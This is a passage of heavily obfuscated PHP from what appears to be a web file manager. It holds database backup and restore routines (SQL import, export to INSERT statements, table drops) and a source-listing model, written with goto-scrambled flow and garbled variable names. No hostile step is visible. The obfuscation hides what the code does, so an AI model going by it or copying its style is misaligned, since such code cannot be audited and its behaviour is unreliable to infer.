A“—‹£¾¬å; Fæˆì‹Ëæá: $c·–íœ½ÒŒ = $F‘ÕØ½åÚ¬[$b¡‘†Ÿ°‚Ÿ[908]]; $F‘ÕØ½åÚ¬[$b¡‘†Ÿ°‚Ÿ[908]] = $b¡‘†Ÿ°‚Ÿ[33]; if ($F‘ÕØ½åÚ¬[$b¡‘†Ÿ°‚Ÿ[741]] == $b¡‘†Ÿ°‚Ÿ[742]) { $Eç„ÌÔ©­æ = $F‘ÕØ½åÚ¬[$b¡‘†Ÿ°‚Ÿ[743]]; $F‘ÕØ½åÚ¬[$b¡‘†Ÿ°‚Ÿ[743]] = substr($Eç„ÌÔ©­æ, 0, strrpos($Eç„ÌÔ©­æ, $b¡‘†Ÿ°‚Ÿ[996])); } goto bµÓïí…Í‡; fâ£ÁĞØ²: $b¡‘†Ÿ°‚Ÿ =& $_SERVER[Æ¼ôºÙï]; $F‘ÕØ½åÚ¬ = array_change_key_case($this->database); if ($this->type == $b¡‘†Ÿ°‚Ÿ[9] || !$DÀŞ”ô‰¯) { return $this->model()->db(); } goto Fæˆì‹Ëæá; bµÓïí…Í‡: $this->database = $F‘ÕØ½åÚ¬; $a²åò²æ¸¨ = $this->model()->db(); try { $Dƒ’îùµ®Í = $a²åò²æ¸¨->execute("\x73\150\157\x77\40\144\141\x74\141\142\x61\163\145\x73\x20\154\x69\x6b\x65\x20\47{$c·–íœ½ÒŒ}\x27"); } catch (Exception $f…ß±äÒƒä) { } goto aïğ—‘Ğ¬¤; A“—‹£¾¬å: $this->database = $F‘ÕØ½åÚ¬; $a²åò²æ¸¨->execute("\x75\x73\145\40\140{$c·–íœ½ÒŒ}\x60"); return $a²åò²æ¸¨; goto d°áİˆèö ; d°áİˆèö : } public function createTable($AÃÊÉÜˆ‚, $FèÂÖí†† = null) { $Cˆ¨¿È…º =& $_SERVER[Æ¼ôºÙï]; if (!IO::exist($AÃÊÉÜˆ‚)) { ActionCall($Cˆ¨¿È…º[997], !0, 0); show_json(LNG($Cˆ¨¿È…º[998]), !1); } $B•½Æ¹½ÃŒ = sqlSplit(IO::getContent($AÃÊÉÜˆ‚)); foreach ($B•½Æ¹½ÃŒ as $EÁöÛÜ§¹ˆ) { if ($FèÂÖí††) { $fÀ§Ò£¹© = stripos($EÁöÛÜ§¹ˆ, $Cˆ¨¿È…º[999]) === 0; if ($fÀ§Ò£¹©) { $FèÂÖí††->task[$Cˆ¨¿È…º[1000]] += 1; } } $this->model()->db()->execute($EÁöÛÜ§¹ˆ); if ($FèÂÖí†† && $fÀ§Ò£¹©) { preg_match($Cˆ¨¿È…º[1001], $EÁöÛÜ§¹ˆ, $FƒÇîÍ´Ã¯); $FèÂÖí††->task[$Cˆ¨¿È…º[1002]] = $FƒÇîÍ´Ã¯[1]; $FèÂÖí††->update(1); } } $this->taskToCache($FèÂÖí††); } public function insertTable($F–©×È¾‡•, $fî‘¸ƒ…¿¨ = null) { $Bˆèğ™›÷Ö =& $_SERVER[Æ¼ôºÙï]; $DÆøöÎØà = $this->model()->db(); $aŞªªé¿—¦ = $DôÀ­·ƒŞ ? array($DôÀ­·ƒŞ) : $DÆøöÎØà->getTables(); foreach ($F–©×È¾‡• as $DÙŸŠ¢Æª¦) { $DôÀ­·ƒŞ = basename($DÙŸŠ¢Æª¦, $Bˆèğ™›÷Ö[736]); if (!in_array($DôÀ­·ƒŞ, $aŞªªé¿—¦)) { continue; } if ($fî‘¸ƒ…¿¨) { $fî‘¸ƒ…¿¨->task[$Bˆèğ™›÷Ö[1002]] = $DôÀ­·ƒŞ; } if (get_filesize($DÙŸŠ¢Æª¦) == 0) { continue; } $Bùãé’ÁÌç = $this->sqlToDb($DÙŸŠ¢Æª¦, $fî‘¸ƒ…¿¨); if (!$Bùãé’ÁÌç) { ActionCall($Bˆèğ™›÷Ö[997], !0, 0); show_json(LNG($Bˆèğ™›÷Ö[1003]) . "\133{$DôÀ­·ƒŞ}\x5d", !1); } } $this->taskToCache($fî‘¸ƒ…¿¨); } public function sqlFromDb($cŒŸ ÀÆ½ê, $Fô†´¿â±ß, $E«¾ë›˜ = null, $e‰ì®³‚ˆ = null) { goto FõÚõ–µŞ®; D†‹¦†•Œ: fclose($dòïÙ†ù£Ö); return $cŸ×¥Õòƒ; goto cÌ£Œñô°Â; A¹¸æñë‹Á: $aéÔã‘á—’ = 1; $e•ŠÑ¦â¨ = 500; $dòïÙ†ù£Ö = fopen($Fô†´¿â±ß, $_SERVER[Æ¼ôºÙï][1004]); goto AŸĞŠä—ğ”; FõÚõ–µŞ®: if ($E«¾ë›˜) { $E«¾ë›˜->task[$_SERVER[Æ¼ôºÙï][1002]] = $cŒŸ ÀÆ½ê; } $cÜ»°ŸÛ’ = $this->model($cŒŸ ÀÆ½ê); $cŸ×¥Õòƒ = 0; goto A¹¸æñë‹Á; AŸĞŠä—ğ”: $B»ŠÌ·í = $cÜ»°ŸÛ’->getPk(); $d¯™ÚòÀİ = $cÜ»°ŸÛ’->getDbFields(); do { $Dœ¹ËÇµ”‹ = $cÜ»°ŸÛ’->field($d¯™ÚòÀİ)->order($B»ŠÌ·í . $_SERVER[Æ¼ôºÙï][1005])->selectPage($e•ŠÑ¦â¨, $aéÔã‘á—’); $aÕ¡™‹¶èÁ = isset($Dœ¹ËÇµ”‹[$_SERVER[Æ¼ôºÙï][360]][$_SERVER[Æ¼ôºÙï][362]]) ? $Dœ¹ËÇµ”‹[$_SERVER[Æ¼ôºÙï][360]][$_SERVER[Æ¼ôºÙï][362]] : 0; $e­Õˆ´‚¤‡ = !empty($Dœ¹ËÇµ”‹[$_SERVER[Æ¼ôºÙï][363]]) ? $Dœ¹ËÇµ”‹[$_SERVER[Æ¼ôºÙï][363]] : array(); if (!($b¯‹¥©Îª¥ = count($e­Õˆ´‚¤‡))) { break; } $aÕ–Ô±¢Ö = array(); foreach ($e­Õˆ´‚¤‡ as $dÛï£¦¾é“) { if ($cŒŸ ÀÆ½ê == $_SERVER[Æ¼ôºÙï][1006] && $dÛï£¦¾é“[$_SERVER[Æ¼ôºÙï][29]] == $_SERVER[Æ¼ôºÙï][1007]) { $dš„ä§‚„Ö = json_decode($dÛï£¦¾é“[$_SERVER[Æ¼ôºÙï][368]], !0); if ($dš„ä§‚„Ö[$_SERVER[Æ¼ôºÙï][28]] == date($_SERVER[Æ¼ôºÙï][709]) && !$dš„ä§‚„Ö[$_SERVER[Æ¼ôºÙï][708]]) { continue; } } if ($e‰ì®³‚ˆ) { $dÛï£¦¾é“[$_SERVER[Æ¼ôºÙï][75]] = "\173\x69\157\72{$e‰ì®³‚ˆ}\175" . substr($dÛï£¦¾é“[$_SERVER[Æ¼ôºÙï][75]], strlen("\173\x69\157\x3a{$dÛï£¦¾é“[$_SERVER[Æ¼ôºÙï][762]]}\x7d")); $dÛï£¦¾é“[$_SERVER[Æ¼ôºÙï][762]] = $e‰ì®³‚ˆ; } $aÕ–Ô±¢Ö[] = $_SERVER[Æ¼ôºÙï][1008] . $this->sqlEncode($dÛï£¦¾é“) . $_SERVER[Æ¼ôºÙï][1009]; } $fäÃÔƒë¡‡ = "\x49\116\x53\x45\122\x54\40\x49\116\x54\x4f\x20\140{$cŒŸ ÀÆ½ê}\140\40\x28\140" . implode($_SERVER[Æ¼ôºÙï][1010], $d¯™ÚòÀİ) . $_SERVER[Æ¼ôºÙï][1011]; fwrite($dòïÙ†ù£Ö, $fäÃÔƒë¡‡ . implode($_SERVER[Æ¼ôºÙï][1012], $aÕ–Ô±¢Ö) . $_SERVER[Æ¼ôºÙï][67] . PHP_EOL); $aéÔã‘á—’++; $cŸ×¥Õòƒ += $b¯‹¥©Îª¥; if ($E«¾ë›˜) { $E«¾ë›˜->update($b¯‹¥©Îª¥); } } while ($aéÔã‘á—’ <= $aÕ¡™‹¶èÁ); goto D†‹¦†•Œ; cÌ£Œñô°Â: } public function sqlToDb($CÂ÷ŒÛ´Å, $FŠ¦ª¦Ç = null) { goto Fœ‘âõøâº; aŒ¶Œ¯‡”›: $c‚–ø²ïÅ = 500 + 1; while (!feof($D¥µÄôñä)) { if ($FŠ¦ª¦Ç && $F“¹ë¡ñ¾± != 0) { $FŠ¦ª¦Ç->task[$BªÙö±–¸Š[1000]] += 1; } $F“¹ë¡ñ¾±++; $c‡—ÂíÏÓÇ = trim(fgets($D¥µÄôñä)); $EËÉÔá©¤ .= $BªÙö±–¸Š[50] . $this->sqlDecode($c‡—ÂíÏÓÇ, $this->type); if ($F“¹ë¡ñ¾± == $c‚–ø²ïÅ) { $EËÉÔá©¤ = rtrim(trim($EËÉÔá©¤), $BªÙö±–¸Š[67]); if (!$A´‡ˆî´æ„->execute($EËÉÔá©¤)) { return !1; } if ($FŠ¦ª¦Ç) { $FŠ¦ª¦Ç->update($F“¹ë¡ñ¾± - 1); } $EËÉÔá©¤ = $BªÙö±–¸Š[33]; $F“¹ë¡ñ¾± = 0; } } fclose($D¥µÄôñä); goto f©â…á å›; Fœ‘âõøâº: $BªÙö±–¸Š =& $_SERVER[Æ¼ôºÙï]; $A´‡ˆî´æ„ = $this->model()->db(); $D¥µÄôñä = @fopen($CÂ÷ŒÛ´Å, $BªÙö±–¸Š[1013]); goto d†¥ƒƒêÆ¯; d†¥ƒƒêÆ¯: if (!$D¥µÄôñä) { return !1; } $F“¹ë¡ñ¾± = 0; $EËÉÔá©¤ = $BªÙö±–¸Š[33]; goto aŒ¶Œ¯‡”›; f©â…á å›: if (trim($EËÉÔá©¤)) { $EËÉÔá©¤ = rtrim(trim($EËÉÔá©¤), $BªÙö±–¸Š[67]); if (!$A´‡ˆî´æ„->execute($EËÉÔá©¤)) { return !1; } if ($FŠ¦ª¦Ç) { $FŠ¦ª¦Ç->update($F“¹ë¡ñ¾± - 1); } } return !0; goto Eãë´¹ğ; Eãë´¹ğ: } public function dropTable($e¼ù ‚ = null) { $EçğÅõĞˆ¶ = $this->model()->db(); $C¸„öøóéõ = $e¼ù ‚ ? array($e¼ù ‚) : $EçğÅõĞˆ¶->getTables(); if (!$C¸„öøóéõ) { return; } foreach ($C¸„öøóéõ as $e¼ù ‚) { $EçğÅõĞˆ¶->execute("\x64\162\x6f\160\x20\164\x61\142\x6c\145\40\151\x66\x20\x65\x78\x69\x73\164\163\40\140{$e¼ù ‚}\140"); } } private function taskToCache($D¾ÕÛğæ = null) { $dÜ¯òó’ÏĞ =& $_SERVER[Æ¼ôºÙï]; if (!$D¾ÕÛğæ) { return; } $B¼¶„¯Î¼ = array($dÜ¯òó’ÏĞ[1002] => $D¾ÕÛğæ->task[$dÜ¯òó’ÏĞ[1002]], $dÜ¯òó’ÏĞ[1000] => $D¾ÕÛğæ->task[$dÜ¯òó’ÏĞ[1000]], $dÜ¯òó’ÏĞ[1014] => $D¾ÕÛğæ->task[$dÜ¯òó’ÏĞ[1014]]); if ($B¼¶„¯Î¼[$dÜ¯òó’ÏĞ[1000]] == $B¼¶„¯Î¼[$dÜ¯òó’ÏĞ[1014]]) { $B¼¶„¯Î¼[$dÜ¯òó’ÏĞ[715]] = 1; } Cache::set($dÜ¯òó’ÏĞ[1015] . $D¾ÕÛğæ->task[$dÜ¯òó’ÏĞ[385]], $B¼¶„¯Î¼); $D¾ÕÛğæ->end(); } private function sqlEncode($D‰°£¯ó‹…) { $F´İ©¬õÔ =& $_SERVER[Æ¼ôºÙï]; $eÊÙ˜¬½ØÊ = array(); foreach ($D‰°£¯ó‹… as $e´ê‘ˆµí) { if (is_array($e´ê‘ˆµí)) { $e´ê‘ˆµí = json_encode_force($e´ê‘ˆµí); } $e´ê‘ˆµí = addslashes($e´ê‘ˆµí); $e´ê‘ˆµí = str_replace(array($F´İ©¬õÔ[1016], $F´İ©¬õÔ[227]), array($F´İ©¬õÔ[1017], $F´İ©¬õÔ[1018]), $e´ê‘ˆµí); $eÊÙ˜¬½ØÊ[] = str_replace($F´İ©¬õÔ[55], $F´İ©¬õÔ[1019], $e´ê‘ˆµí); } return $F´İ©¬õÔ[55] . implode($F´İ©¬õÔ[1020], $eÊÙ˜¬½ØÊ) . $F´İ©¬õÔ[55]; } private function sqlDecode($CÍ‰…ë¬é½, $b’ÏˆÅç‡) { $C×’ÏÛÙ =& $_SERVER[Æ¼ôºÙï]; $CÍ‰…ë¬é½ = str_replace(array($C×’ÏÛÙ[1017], $C×’ÏÛÙ[1018]), array($C×’ÏÛÙ[1016], $C×’ÏÛÙ[227]), $CÍ‰…ë¬é½); if ($b’ÏˆÅç‡ == $C×’ÏÛÙ[9]) { $CÍ‰…ë¬é½ = stripslashes($CÍ‰…ë¬é½); } return $CÍ‰…ë¬é½; } } goto Açë ¾’ßö; f°õ‚ïàó: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\x65"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\145" => "\151\157\x5f\163\157\165\x72\x63\145\137\155\145\x74\141", "\x6d\145\x74\x61\x46\x69\x65\x6c\144" => "\163\x6f\x75\162\143\145\111\104"); protected $dataAuto = array(array("\155\157\144\x69\146\x79\x54\151\155\145", "\164\x69\x6d\145", "\x69\156\163\x65\x72\x74", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\x63\162\145\141\164\x65\x54\151\x6d\145", "\164\151\155\145", "\151\x6e\x73\145\162\164", "\x66\x75\156\143\164\151\157\156"), array("\x76\x69\x65\x77\124\x69\155\x65", "\164\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\x66\165\156\143\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($FÂ¶‚÷Š¾) { return $this->listSource(array($_SERVER[Æ¼ôºÙï][386] => $FÂ¶‚÷Š¾)); } public function typeName($BÀëÊÖ‰»ï) { static $f»ƒíÜÖ³â = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\x65\x6d", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\147\162\157\x75\160"); return $f»ƒíÜÖ³â[$BÀëÊÖ‰»ï . $_SERVER[Æ¼ôºÙï][33]]; } public function sourceListInfo($cä™ÅòÏ½Ì, $bóØÅ‰Ç = false) { goto C»ã´‘ÊÊ²; C»ã´‘ÊÊ²: $BÉ«Íâ†º¡ =& $_SERVER[Æ¼ôºÙï]; $cä™ÅòÏ½Ì = $cä™ÅòÏ½Ì ? $cä™ÅòÏ½Ì : array(); $cä™ÅòÏ½Ì = array_filter(array_unique($cä™ÅòÏ½Ì)); goto d‘ÏìÄåêì; dİÍÅˆ÷ã: return array_to_keyvalue($fŞØØ‡¨ §, $BÉ«Íâ†º¡[387]); goto C“ŠöĞ¼êŠ; d‘ÏìÄåêì: if (!$cä™ÅòÏ½Ì) { return array(); } $fŞØØ‡¨ § = $this->where(array($BÉ«Íâ†º¡[387] => array($BÉ«Íâ†º¡[7], $cä™ÅòÏ½Ì)))->select(); $this->_listDataApply($fŞØØ‡¨ §, $bóØÅ‰Ç); goto dİÍÅˆ÷ã; C“ŠöĞ¼êŠ: } public function pathInfoFilter($a¡„Ú°Ù¥œ) { goto fĞßïéâÛä; Dç‹ŸÈ: $a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[389]] = $this->typeName($a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[389]]); if ($a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[388]] != 1) { $a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[167]] = $a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[390]]; unset($a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[390]]); } $eôôç¯¤È = $d¤‘±‹¥œá[391]; goto eè‰§É¶­; fĞßïéâÛä: $d¤‘±‹¥œá =& $_SERVER[Æ¼ôºÙï]; $a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[75]] = KodIO::make($a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[387]]); $a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[29]] = $a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[388]] == 1 ? $d¤‘±‹¥œá[76] : $d¤‘±‹¥œá[173]; goto Dç‹ŸÈ; BÈòÃ•Şæ­: if (isset($a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[394]]) && $a¡„Ú°Ù¥œ[$d¤‘±‹¥œá[394]][$d¤‘±‹¥œá[395]] == -1) { $c¶ÎÓ‘¡Ç§ = array_remove_value($c¶ÎÓ‘¡Ç§, $d¤‘±‹¥œá[192]); $c¶ÎÓ‘¡Ç§ = array_remove_value($c¶ÎÓ‘¡Ç§, $d¤‘±‹¥œá[83]); $c¶ÎÓ‘¡Ç§ = array_remove_value($c¶ÎÓ‘¡Ç§, $d¤‘±‹¥œá[396]); $c¶ÎÓ‘¡Ç§ = array_remove_value($c¶ÎÓ‘¡Ç§, $d¤‘±‹¥œá[397]); $c¶ÎÓ‘¡Ç§ = array_remove_value($c¶ÎÓ‘¡Ç§, $d¤‘±‹¥œá[77]); $c¶ÎÓ‘¡Ç§ = array_remove_value($c¶ÎÓ‘¡Ç§, $d¤‘±‹¥œá[398]); } $a¡„Ú°Ù¥œ = array_field_key($a¡„Ú°Ù¥œ, $c¶ÎÓ‘¡Ç§); return $a¡„Ú°Ù¥œ; goto aºÜñò¹“Å; eè‰§É¶­: $eôôç¯¤È .= $d¤‘±‹¥œá[392]; $eôôç¯¤È .= $d¤‘±‹¥œá[393]; $c¶ÎÓ‘¡Ç§ = explode($d¤‘±‹¥œá[47], $eôôç¯¤È); goto BÈòÃ•Şæ­; aºÜñò¹“Å: } public function listUserFav() { goto cÙ¿–Èˆ©Î; Fğá°ÉÒ÷ö: foreach ($aºŸÁĞÉ¢š as &$bßºŸÎš‚•) { $bßºŸÎš‚• = array($fÒÕ¥ŠÃç[403] => $bßºŸÎš‚•[$fÒÕ¥ŠÃç[385]], $fÒÕ¥ŠÃç[404] => $bßºŸÎš‚•[$fÒÕ¥ŠÃç[28]], $fÒÕ¥ŠÃç[405] => $bßºŸÎš‚•[$fÒÕ¥ŠÃç[75]], $fÒÕ¥ŠÃç[406] => $bßºŸÎš‚•[$fÒÕ¥ŠÃç[29]], $fÒÕ¥ŠÃç[407] => $bßºŸÎš‚•[$fÒÕ¥ŠÃç[192]], $fÒÕ¥ŠÃç[408] => $bßºŸÎš‚•[$fÒÕ¥ŠÃç[83]]); if ($bßºŸÎš‚•[$fÒÕ¥ŠÃç[29]] == $fÒÕ¥ŠÃç[400] && $e±É×éÏ—à[$bßºŸÎš‚•[$fÒÕ¥ŠÃç[75]]]) { $bßºŸÎš‚•[$fÒÕ¥ŠÃç[84]] = $e±É×éÏ—à[$bßºŸÎš‚•[$fÒÕ¥ŠÃç[75]]]; } } unset($bßºŸÎš‚•); return $aºŸÁĞÉ¢š; goto E—ÅÇ‘ƒš; cÎ§ÜøŠÈ: $AÎ¤ëÔ¢êí = array_to_keyvalue($AÎ¤ëÔ¢êí, $fÒÕ¥ŠÃç[33], $fÒÕ¥ŠÃç[75]); if ($AÎ¤ëÔ¢êí) { $e±É×éÏ—à = $this->listSource(array($fÒÕ¥ŠÃç[401] => array($fÒÕ¥ŠÃç[402], $AÎ¤ëÔ¢êí))); } $e±É×éÏ—à = array_to_keyvalue($e±É×éÏ—à[$fÒÕ¥ŠÃç[363]], $fÒÕ¥ŠÃç[387]); goto Fğá°ÉÒ÷ö; cÙ¿–Èˆ©Î: $fÒÕ¥ŠÃç =& $_SERVER[Æ¼ôºÙï]; $aºŸÁĞÉ¢š = Model($fÒÕ¥ŠÃç[399])->listData(); $AÎ¤ëÔ¢êí = array_filter_by_field($aºŸÁĞÉ¢š, $fÒÕ¥ŠÃç[29], $fÒÕ¥ŠÃç[400]); goto cÎ§ÜøŠÈ; E—ÅÇ‘ƒš: } public function listUserTag($f„‚‰œÇöÕ) { goto eÔ’”ÆåƒĞ; F”İ…æô‚: if (!$E‡˜Ã¸å– || count($E÷Í¤¡®¶¤) == $E‡˜Ã¸å–[$CÜŠ†íàÕ¶[360]][$CÜŠ†íàÕ¶[361]]) { return $E‡˜Ã¸å–; } $dÀ™¬˜¾Æ = array(); $bïéŠÖœ÷ = array_to_keyvalue($E‡˜Ã¸å–[$CÜŠ†íàÕ¶[74]], $CÜŠ†íàÕ¶[33], $CÜŠ†íàÕ¶[387]); goto A…ùĞãƒ‘¹; AÂÔÕÑ™Ÿà: if ($dÀ™¬˜¾Æ) { Model($CÜŠ†íàÕ¶[411])->removeBySource($dÀ™¬˜¾Æ); } return $E‡˜Ã¸å–; goto fÕ¥ ¥Ïİ; eÔ’”ÆåƒĞ: $CÜŠ†íàÕ¶ =& $_SERVER[Æ¼ôºÙï]; if ($f„‚‰œÇöÕ && !is_array($f„‚‰œÇöÕ)) { $f„‚‰œÇöÕ = array($f„‚‰œÇöÕ); } $BÎ¨í·×´Ò = Model($CÜŠ†íàÕ¶[409])->listData(); goto D×‘¯ÉªŒÙ; D×‘¯ÉªŒÙ: $A¢ŠÇòğõ = array(); foreach ($BÎ¨í·×´Ò as $fšé¤ãâ³¬) { $f³šç‹¢² = $fšé¤ãâ³¬[$CÜŠ†íàÕ¶[75]]; if (!$f³šç‹¢²) { continue; } if (!isset($A¢ŠÇòğõ[$f³šç‹¢²])) { $A¢ŠÇòğõ[$f³šç‹¢²] = array(); } $A¢ŠÇòğõ[$f³šç‹¢²][] = $fšé¤ãâ³¬[$CÜŠ†íàÕ¶[410]]; } $E÷Í¤¡®¶¤ = array(); goto Döã·éñ©µ; A…ùĞãƒ‘¹: $eæØ¬Ó—ìñ = array_to_keyvalue($E‡˜Ã¸å–[$CÜŠ†íàÕ¶[73]], $CÜŠ†íàÕ¶[33], $CÜŠ†íàÕ¶[387]); $aŠÍÍŠäÔ· = array_merge($eæØ¬Ó—ìñ, $bïéŠÖœ÷); foreach ($E÷Í¤¡®¶¤ as $f³šç‹¢²) { if (!in_array($f³šç‹¢², $aŠÍÍŠäÔ·)) { $dÀ™¬˜¾Æ[] = $f³šç‹¢²; } } goto AÂÔÕÑ™Ÿà; Döã·éñ©µ: foreach ($A¢ŠÇòğõ as $fÃ…–È­½‰ => $a¸Ã£×¬É…) { $Eâİçâ…ëã = !0; if (!$f„‚‰œÇöÕ) { $E÷Í¤¡®¶¤[] = $fÃ…–È­½‰; continue; } foreach ($f„‚‰œÇöÕ as $DâÑî§°º) { if (!in_array($DâÑî§°º, $a¸Ã£×¬É…)) { $Eâİçâ…ëã = !1; break; } } if ($Eâİçâ…ëã) { $E÷Í¤¡®¶¤[] = $fÃ…–È­½‰; } } if (!$E÷Í¤¡®¶¤) { return array(); } $E‡˜Ã¸å– = $this->listSource(array($CÜŠ†íàÕ¶[401] => array($CÜŠ†íàÕ¶[402], $E÷Í¤¡®¶¤))); goto F”İ…æô‚; fÕ¥ ¥Ïİ: } public function listUserRecycle() { $e‘…ò™°Ü =& $_SERVER[Æ¼ôºÙï]; $càíÈ¶î…ô = Model($e‘…ò™°Ü[412])->listData(); if (!$càíÈ¶î…ô) { return array(); } $dˆëõÍ‚ = array($e‘…ò™°Ü[401] => array($e‘…ò™°Ü[402], $càíÈ¶î…ô), $e‘…ò™°Ü[413] => 1); return $this->listSource($dˆëõÍ‚); } public function listSource($d¨ìãÜ´¯‚, $B¡»àå´¿  = 3000) { goto f‚‹…ÒÎã; f‚‹…ÒÎã: $b¾¡’÷‘ô÷ =& $_SERVER[Æ¼ôºÙï]; if (!isset($d¨ìãÜ´¯‚[$b¾¡’÷‘ô÷[414]])) { $d¨ìãÜ´¯‚[$b¾¡’÷‘ô÷[414]] = 0; } $FéÍ¶…°°‘ = $b¾¡’÷‘ô÷[415]; goto D†ÃÚ¹‚; BİæğÏŒ¨å: return $dìˆãŸÈäà; goto BßÛ¬±ê…í; D†ÃÚ¹‚: $dìˆãŸÈäà = $this->field($FéÍ¶…°°‘)->_makeOrder()->where($d¨ìãÜ´¯‚)->selectPage($B¡»àå´¿ ); $this->_listDataApply($dìˆãŸÈäà[$b¾¡’÷‘ô÷[363]]); $this->_listMake($dìˆãŸÈäà); goto BİæğÏŒ¨å; BßÛ¬±ê…í: } protected function _makeOrder() { goto bïá‚Ôñ×Ş; f˜¬‘ÄİŒ: $AÊô­Î÷Ø = array($Bìšíõà£±[419] => $Bìšíõà£±[420], $Bìšíõà£±[421] => $Bìšíõà£±[422]); $c”µ¶©ˆ©‹ = array($Bìšíõà£±[28] => $Bìšíõà£±[28], $Bìšíõà£±[77] => $Bìšíõà£±[77], $Bìšíõà£±[167] => $Bìšíõà£±[390], $Bìšíõà£±[396] => $Bìšíõà£±[396], $Bìšíõà£±[423] => $Bìšíõà£±[397], $Bìšíõà£±[192] => $Bìšíõà£±[192], $Bìšíõà£±[83] => $Bìšíõà£±[83]); $aàåÉ•Ë…” = Input::get($Bìšíõà£±[424], $Bìšíõà£±[7], $Eìöß«“¨, array_keys($c”µ¶©ˆ©‹)); goto CÃ‡ˆÄ‡¯; b„©ÛçÅØ¿: if ($aàåÉ•Ë…” == $Bìšíõà£±[28]) { } $b¤À˜•Ê•¿ = $Bìšíõà£±[426] . $c”µ¶©ˆ©‹[$aàåÉ•Ë…”] . $Bìšíõà£±[50] . $AÊô­Î÷Ø[$c›´©Ğ»„Ğ]; return $this->order(rtrim(trim($b¤À˜•Ê•¿), $Bìšíõà£±[47])); goto bŸíË¾‡Û; bïá‚Ôñ×Ş: $Bìšíõà£± =& $_SERVER[Æ¼ôºÙï]; $Eìöß«“¨ = Model($Bìšíõà£±[416])->get($Bìšíõà£±[417]); $c¹Ã„ù¤”İ = Model($Bìšíõà£±[416])->get($Bìšíõà£±[418]); goto f˜¬‘ÄİŒ; CÃ‡ˆÄ‡¯: $c›´©Ğ»„Ğ = Input::get($Bìšíõà£±[425], $Bìšíõà£±[7], $c¹Ã„ù¤”İ, array_keys($AÊô­Î÷Ø)); if (!in_array($aàåÉ•Ë…”, array_keys($c”µ¶©ˆ©‹))) { $aàåÉ•Ë…” = $Bìšíõà£±[28]; } if (!in_array($c›´©Ğ»„Ğ, array_keys($AÊô­Î÷Ø))) { $aàåÉ•Ë…” = $Bìšíõà£±[419]; } goto b„©ÛçÅØ¿; bŸíË¾‡Û: } protected function _listDataApplyItem($A”óì°†ïÇ, $d˜„™±Â·õ = false) { $b×¢¯¹¹£É = array($A”óì°†ïÇ); $this->_listDataApply($b×¢¯¹¹£É, $d˜„™±Â·õ); return $b×¢¯¹¹£É[0]; } protected function _listDataApply(&$b×ñ—¢ù¨, $aÎÑµƒŠñ‹ = false) { goto dŒ¿Äƒ™©—; dŒ…š¹É: $this->_listAppendUser($b×ñ—¢ù¨); $this->_listFilterInfo($b×ñ—¢ù¨, $aÎÑµƒŠñ‹); goto Bè¯“‰…ªÔ; dŒ¿Äƒ™©—: $d½À¯ÁÕ× =& $_SERVER[Æ¼ôºÙï]; if (!$b×ñ—¢ù¨) { $b×ñ—¢ù¨ = array(); return; } $cÏÖİÌ  = array_to_keyvalue($b×ñ—¢ù¨, $d½À¯ÁÕ×[33], $d½À¯ÁÕ×[387]); goto a¡´ÛõàøØ; Aêğ¶ÀÀ†: $this->_listAppendPath($b×ñ—¢ù¨); $this->_listAppendAuth($b×ñ—¢ù¨); $this->_listAppendSourceInfo($b×ñ—¢ù¨, $cÏÖİÌ ); goto dŒ…š¹É; a¡´ÛõàøØ: $cÏÖİÌ  = array_unique($cÏÖİÌ ); $this->_listSourceCache($b×ñ—¢ù¨); if (!$aÎÑµƒŠñ‹) { $this->_listAppendMeta($b×ñ—¢ù¨, $cÏÖİÌ ); $this->_listAppendFileMeta($b×ñ—¢ù¨, $cÏÖİÌ ); $this->_listAppendChildren($b×ñ—¢ù¨, $cÏÖİÌ ); } goto Aêğ¶ÀÀ†; Bè¯“‰…ªÔ: } protected function _listSourceCache($DîŠ§·ºŞÑ) { $eœô‹½çÔ¢ =& $_SERVER[Æ¼ôºÙï]; foreach ($DîŠ§·ºŞÑ as $f„ˆéå£°) { self::$cacheSourceInfo[$eœô‹½çÔ¢[427] . $f„ˆéå£°[$eœô‹½çÔ¢[387]]] = $f„ˆéå£°; } } protected function _listFilterInfo(&$d…È¤çÒ‰ã, $eò¦¶´öïå = false) { $c‘¨¶Ç–ºÌ =& $_SERVER[Æ¼ôºÙï]; foreach ($d…È¤çÒ‰ã as &$aöØİ‹¹Ô) { $aöØİ‹¹Ô = $this->pathInfoFilter($aöØİ‹¹Ô); self::$cachePathInfo[$c‘¨¶Ç–ºÌ[428] . intval($eò¦¶´öïå) . $c‘¨¶Ç–ºÌ[429] . $aöØİ‹¹Ô[$c‘¨¶Ç–ºÌ[387]]] = $aöØİ‹¹Ô; } unset($aöØİ‹¹Ô); } protected function _listMake(&$Eó“¿¥‰) { $d—äõÚ’¤ =& $_SERVER[Æ¼ôºÙï]; $Eó“¿¥‰[$d—äõÚ’¤[74]] = array(); $Eó“¿¥‰[$d—äõÚ’¤[73]] = array(); foreach ($Eó“¿¥‰[$d—äõÚ’¤[363]] as $Cñ¼º¬¶ÄÑ) { $Eã´§‘–øÑ = $Cñ¼º¬¶ÄÑ[$d—äõÚ’¤[388]] == 1 ? $d—äõÚ’¤[74] : $d—äõÚ’¤[73]; $Eó“¿¥‰[$Eã´§‘–øÑ][] = $Cñ¼º¬¶ÄÑ; } unset($Eó“¿¥‰[$d—äõÚ’¤[363]]); } protected function _listAppendMeta(&$Få’‰¸ç«, $Eï²ö¢š‹‰) { goto Aôù×ÌÕìœ; fš´ò•¤ò: foreach ($C¬æš­Øßæ as $D’¶£¶Î¾ğ) { if 